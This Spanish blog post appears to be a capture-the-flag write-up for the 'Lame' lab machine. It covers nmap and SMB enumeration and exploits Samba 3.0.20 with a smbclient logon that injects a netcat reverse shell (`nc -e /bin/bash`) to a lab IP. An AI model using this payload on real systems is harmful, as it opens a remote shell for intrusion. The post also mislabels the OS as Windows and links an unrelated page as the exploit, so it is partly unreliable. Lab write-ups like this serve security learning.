---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Lame               |
| Os                     | Windows            |
| Difficulty             | Easy               |
| Points                 | 0                  |
| IP                     | 10.10.10.3         |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Lame/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.3
```

![nmap 1](/assets/images/Lame/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
```

![nmap2](/assets/images/Lame/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p21,22,80,139,445,3632 10.10.10.3 -oN targeted
```

![nmap 3](/assets/images/Lame/nmap3.png)

Lo primero que podemos intentar sobre esta maquina windows para enumerar informacion es:

```s
enum4linux -a 10.10.10.3
```

```s
smbclient --no-pass --list=10.10.10.3
```

![smb 1](/assets/images/Lame/smb1.png)

Parece que tendremos que abusar del vsfp y en exploitdb existe un <a href="https://itluke.online/2018/11/27/how-to-display-firewall-rule-ports-with-powershell/">codigo</a> que lo hace vulnerable

Al parecer no es vulnerable la maquina para este servicio, lo siguiente seria buscar en el mismo metasploit sobre la version de samba ahora.

```s
searchsploit samba 3.0.20
#para examinarlo utilizamos el parametro -x
```

Una vez analizando como funciona el exploit, manualmente podemos ejecutar:

```s
smbclient -L 10.10.10.3 -N --option="client min protocol=NT1"
```

![smbclient 2](/assets/images/Lame/smclient2.png)

Despues de ver que tiene activado el usuario Anonymous, podemos intentar ahora:

```s
smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=`nc -e /bin/bash 10.10.14.22 443`"'
```

El primer intento que hice con este metodo me quedo, pero despues dejo de servir. Por suerte metasploit tiene un modulo para samba y les dejo cual fue, solo tuve que poner el LHOST y RHOST ademas.
Automaticamente obtendremos el root y podremos avanzar.

![root](/assets/images/Lame/meta.png)

![powned](/assets/images/Lame/smclient2.png)